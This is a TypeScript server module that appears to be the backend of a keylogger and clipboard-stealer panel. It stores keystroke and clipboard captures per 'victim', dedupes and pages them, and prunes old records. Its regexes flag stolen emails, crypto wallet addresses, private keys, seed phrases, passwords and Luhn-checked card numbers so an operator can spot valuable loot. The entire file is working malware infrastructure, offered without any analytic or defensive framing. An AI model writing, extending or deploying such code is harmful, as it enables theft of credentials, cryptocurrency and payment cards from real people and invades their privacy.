import { prisma } from './db';
import { publish } from './bus';
import { env } from './env';

/** Whole seconds of a persisted entry, capped by the contract frame size. */
export const MAX_ENTRY = 262_144;
const RING_MAX = 5000;

export type Origin = 'keystroke' | 'clipboard';

export type Entry = {
  id: string;
  victimId: string;
  ts: string;
  origin: Origin;
  process: string;
  title: string;
  content: string;
  kind: string;
  patterns: string[];
  count: number;
};

const EMAIL = /\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b/i;
const EVM = /0x[a-fA-F0-9]{40}/;
const BTC = /\b(bc1[a-z0-9]{20,80}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b/;
const SOL = /\b[1-9A-HJ-NP-Za-km-z]{32,44}\b/;
const CARD = /\b(?:\d[ -]?){12,18}\d\b/;
const SEED = /\b(abandon|ability|able|about|above|absent|absorb|abstract|absurd|abuse|access|accident)\b(?:[ ]+\w+){11,23}/i;
const MNEMONIC = /\b(seed|mnemonic|frase semilla|palabras? semilla|recovery phrase)\b/i;
const PASSWORD = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[^ ]{8,64}$/;
const KEY = /^(xprv[1-9A-HJ-NP-Za-km-z]{50,111}|[0-9a-fA-F]{64})$/;

/** Pattern tags used by the panel to highlight values. Cheap and bounded. */
function luhn(digits: string): boolean {
  let sum = 0;
  let double = false;
  for (let index = digits.length - 1; index >= 0; index -= 1) {
    let digit = digits.charCodeAt(index) - 48;
    if (double) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
    double = !double;
  }
  return sum % 10 === 0;
}

export function patterns(value: string): string[] {
  const out: string[] = [];
  if (EMAIL.test(value)) out.push('email');
  if (EVM.test(value)) out.push('wallet-evm');
  if (BTC.test(value)) out.push('wallet-btc');
  else if (SOL.test(value) && !/^[0-9a-f]{40,}$/i.test(value)) out.push('wallet-base58');
  if (KEY.test(value.trim())) out.push('key');
  if (SEED.test(value)) out.push('seed');
  if (MNEMONIC.test(value)) out.push('mnemonic');
  if (PASSWORD.test(value.trim())) out.push('password');
  const card = value.match(CARD)?.[0];
  if (card) {
    const digits = card.replace(/\D/g, '');
    if (digits.length >= 13 && digits.length <= 19 && luhn(digits)) out.push('card');
  }
  return out;
}

const ring = new Map<string, Entry[]>();
/** Dedupe window for identical keystroke deltas inside the same window. */
const seen = new Map<string, { at: number; id: string }>();

function pushRing(entry: Entry): void {
  const list = ring.get(entry.victimId) ?? [];
  list.unshift(entry);
  if (list.length > RING_MAX) list.length = RING_MAX;
  ring.set(entry.victimId, list);
}

/**
 * Persist one granular entry, ring it and publish. The DB is the source of
 * truth; the ring only short-circuits the first page after the write.
 */
export async function recordEntry(
  victimId: string,
  origin: Origin,
  data: Record<string, unknown>,
  legacy = ''
): Promise<Entry | null> {
  const content = String(data[origin === 'keystroke' ? 'text' : 'content'] ?? legacy).slice(0, MAX_ENTRY);
  if (!content.trim()) return null;
  const process = String(data.process ?? '').slice(0, 260);
  const title = String(data.title ?? '').slice(0, 512);
  const kind = String(data.kind ?? (origin === 'clipboard' ? 'text' : 'keystroke')).slice(0, 32);
  const tags = patterns(content);
  const key = `${victimId}\u0000${origin}\u0000${process}\u0000${title}\u0000${content}`;
  const now = Date.now();
  const previous = seen.get(key);
  if (previous && now - previous.at < 1_500) {
    const existing = await prisma.timelineEntry.update({
      where: { id: previous.id },
      data: { ts: new Date(), count: { increment: 1 } }
    }).catch(() => null);
    if (existing) {
      const entry = serialize(existing);
      pushRing(entry);
      void publish({ type: 'timeline.new', victimId, at: now, data: entry as unknown as Record<string, unknown> });
      return entry;
    }
  }
  const row = await prisma.timelineEntry.create({
    data: { victimId, origin, process, title, content, kind, patterns: tags }
  }).catch(() => null);
  if (!row) return null;
  seen.set(key, { at: now, id: row.id });
  if (seen.size > 20_000) {
    for (const [k, v] of seen) if (now - v.at > 60_000) seen.delete(k);
  }
  const entry = serialize(row);
  pushRing(entry);
  void publish({ type: 'timeline.new', victimId, at: now, data: entry as unknown as Record<string, unknown> });
  return entry;
}

function serialize(row: { id: string; victimId: string; ts: Date; origin: string; process: string; title: string; content: string; kind: string; patterns: string[]; count: number }): Entry {
  return {
    id: row.id,
    victimId: row.victimId,
    ts: row.ts.toISOString(),
    origin: row.origin === 'keystroke' ? 'keystroke' : 'clipboard',
    process: row.process,
    title: row.title,
    content: row.content,
    kind: row.kind,
    patterns: row.patterns,
    count: row.count
  };
}

/** First page comes from the ring; paged/search queries hit the DB. */
export async function page(
  victimId: string,
  query: { q?: string; type?: string; cursor?: string; limit: number }
): Promise<{ items: Entry[]; next: string | null }> {
  if (!query.q && !query.type && !query.cursor) {
    const local = (ring.get(victimId) ?? []).slice(0, query.limit);
    if (local.length > 0) {
      const fresh = await prisma.timelineEntry.findMany({
        where: { victimId, ...(local.at(-1) ? { ts: { gt: new Date(local.at(-1)!.ts) } } : {}) },
        orderBy: { ts: 'desc' },
        take: query.limit
      }).catch(() => []);
      const merged = [...local, ...fresh.map(serialize)];
      const unique = new Map(merged.map((item) => [item.id, item]));
      const items = [...unique.values()].sort((a, b) => b.ts.localeCompare(a.ts)).slice(0, query.limit);
      return { items, next: items.length === query.limit ? items.at(-1)!.id : null };
    }
  }
  const rows = await prisma.timelineEntry.findMany({
    where: {
      victimId,
      ...(query.type ? { origin: query.type } : {}),
      ...(query.q ? { OR: [
        { content: { contains: query.q, mode: 'insensitive' as const } },
        { title: { contains: query.q, mode: 'insensitive' as const } },
        { process: { contains: query.q, mode: 'insensitive' as const } }
      ] } : {})
    },
    orderBy: { ts: 'desc' },
    take: query.limit,
    ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {})
  });
  return { items: rows.map(serialize), next: rows.length === query.limit ? rows.at(-1)?.id ?? null : null };
}

export async function prune(): Promise<void> {
  const days = new Date(Date.now() - env.TIMELINE_RETENTION_DAYS * 86_400_000);
  await prisma.timelineEntry.deleteMany({ where: { ts: { lt: days } } }).catch(() => undefined);
  const victims = await prisma.victim.findMany({ select: { id: true } });
  for (const victim of victims) {
    const rows = await prisma.timelineEntry.findMany({
      where: { victimId: victim.id },
      orderBy: { ts: 'desc' },
      select: { id: true },
      skip: env.TIMELINE_MAX_PER_VICTIM
    }).catch(() => []);
    if (rows.length === 0) continue;
    await prisma.timelineEntry.deleteMany({ where: { id: { in: rows.map((row) => row.id) } } }).catch(() => undefined);
  }
  const cutoff = Date.now() - 60_000;
  for (const [key, value] of seen) if (value.at < cutoff) seen.delete(key);
}
